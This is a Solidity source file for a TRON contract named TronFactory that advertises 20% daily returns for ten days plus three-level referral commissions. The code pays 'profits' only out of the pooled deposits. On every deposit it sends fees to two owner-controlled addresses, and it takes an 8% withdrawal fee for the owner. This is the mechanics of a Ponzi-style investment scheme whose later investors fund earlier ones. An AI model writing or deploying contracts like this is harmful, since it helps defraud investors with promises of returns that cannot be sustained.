//SourceUnit: TronFactory.sol

/*
          



████████╗██████╗░░█████╗░███╗░░██╗███████╗░█████╗░░█████╗░████████╗░█████╗░██████╗░██╗░░░██╗
╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝
░░░██║░░░██████╔╝██║░░██║██╔██╗██║█████╗░░███████║██║░░╚═╝░░░██║░░░██║░░██║██████╔╝░╚████╔╝░
░░░██║░░░██╔══██╗██║░░██║██║╚████║██╔══╝░░██╔══██║██║░░██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░
░░░██║░░░██║░░██║╚█████╔╝██║░╚███║██║░░░░░██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░
                               
    20% Per Day  upto 10 Days                                               
    15% Referral Commission 


    3 Level Referral
    Level 1 = 10%                                                    
    Level 2 =  3%                                                   
    Level 3 =  2%                                                   
    
    
    // Website: https://TronFactory.com



*/
pragma solidity ^0.4.17;

contract TronFactory {
    using SafeMath for uint256;
    uint256 public totalPlayers;
    uint256 public totalPayout;
    uint256 private nowtime = now;
    uint256 public totalRefDistributed;
    uint256 public totalInvested;
    uint256 private minDepositSize = 100000000;
    uint256 private interestRateDivisor = 1000000000000;
    uint256 public devCommission = 1;
    uint256 public commissionDivisor = 100;
    uint256 private minuteRate = 2314814;
    address private feed1 = msg.sender;
    address private feed2 = msg.sender;
    uint private releaseTime = 1610370000;

    address owner;
    struct Player {
        uint256 trxDeposit;
        uint256 time;
        uint256 j_time;
        uint256 interestProfit;
        uint256 affRewards;
        uint256 payoutSum;
        address affFrom;
        uint256 td_team;
        uint256 td_business;
        uint256 reward_earned;
    }

    struct Preferral {
        address player_addr;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
    }

    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;

    constructor() public {
        owner = msg.sender;
    }

    function register(address _addr, address _affAddr) private {
        Player storage player = players[_addr];

        player.affFrom = _affAddr;
        players[_affAddr].td_team = players[_affAddr].td_team.add(1);

        setRefCount(_addr, _affAddr);
    }

    function setRefCount(address _addr, address _affAddr) private {
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;
        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;

        preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
        preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
        preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);
    }

    function deposit(address _affAddr) public payable {
         require(now >= releaseTime, "not launched yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);

        uint256 depositAmount = msg.value;

        Player storage player = players[msg.sender];

        player.j_time = now;

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;

            // if affiliator is not admin as well as he deposited some amount
            if (_affAddr != address(0) && players[_affAddr].trxDeposit > 0) {
                register(msg.sender, _affAddr);
            } else {
                register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        players[_affAddr].td_business = players[_affAddr].td_business.add(
            depositAmount
        );

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint256 feed1earn =
            depositAmount.mul(devCommission).mul(4).div(commissionDivisor);
        uint256 feed2earn =
            depositAmount.mul(devCommission).mul(4).div(commissionDivisor);

        feed1.transfer(feed1earn);
        feed2.transfer(feed2earn);
    }

    function withdraw_referral() public {
        require(players[msg.sender].affRewards > 0);

        transferReferral(msg.sender, players[msg.sender].affRewards);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
        collect(msg.sender);
        Player storage player = players[msg.sender];
        uint256 depositAmount = player.interestProfit;
        require(address(this).balance >= depositAmount);
        player.interestProfit = 0;
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(depositAmount, player.affFrom);

        uint256 feed1earn =
            depositAmount.mul(devCommission).mul(4).div(commissionDivisor);
        uint256 feed2earn =
            depositAmount.mul(devCommission).mul(4).div(commissionDivisor);

        feed1.transfer(feed1earn);
        feed2.transfer(feed2earn);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint256 secPassed = now.sub(player.time);
        if (secPassed > 864000 && player.time > 0) {
            secPassed = 864000; // 10 days
            uint256 collectProfit =
                (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(
                    interestRateDivisor
                );
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        } else if (secPassed > 0 && player.time > 0) {
            collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate)))
                .div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferReferral(address _receiver, uint256 _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint256 contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint256 payout =
                    _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                players[_receiver].affRewards = players[_receiver]
                    .affRewards
                    .sub(payout);
                Player storage player = players[_receiver];

                player.payoutSum = player.payoutSum.add(payout);
                msg.sender.transfer(payout);
            }
        }
    }

    function transferPayout(address _receiver, uint256 _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint256 contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint256 payout =
                    _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                uint256 maxProfit = (player.trxDeposit.mul(240)).div(100);
                uint256 paid = player.payoutSum;
                if (paid > maxProfit) {
                    player.trxDeposit = 0;
                }

                uint256 withdraw_fee = (payout * 8) / 100;
                payout = payout - withdraw_fee;
                owner.transfer(withdraw_fee);
                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private {
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affFrom != address(0)) {
            _affRewards = (_trx.mul(10)).div(100);

            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affFrom].affRewards = players[_affFrom].affRewards.add(
                _affRewards
            );
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(
                _affRewards
            );
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);

            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(
                _affRewards
            );
        }
    }

    function getProfit(address _addr) public view returns (uint256) {
        address playerAddress = _addr;
        Player storage player = players[playerAddress];
        require(player.time > 0, "player time is 0");

        uint256 secPassed = now.sub(player.time);
        if (secPassed > 0) {
            if (secPassed > 864000) {
                secPassed = 864000;
                uint256 collectProfit =
                    (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(
                        interestRateDivisor
                    );
            } else {
                collectProfit = (
                    player.trxDeposit.mul(secPassed.mul(minuteRate))
                )
                    .div(interestRateDivisor);
            }
        }
        return collectProfit.add(player.interestProfit);
    }

    function updateFeed1(address _address) public {
        require(msg.sender == owner);
        feed1 = _address;
    }

    function updateFeed2(address _address) public {
        require(msg.sender == owner);
        feed2 = _address;
    }

    function getContractBalance() public view returns (uint256 cBal) {
        return address(this).balance;
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
}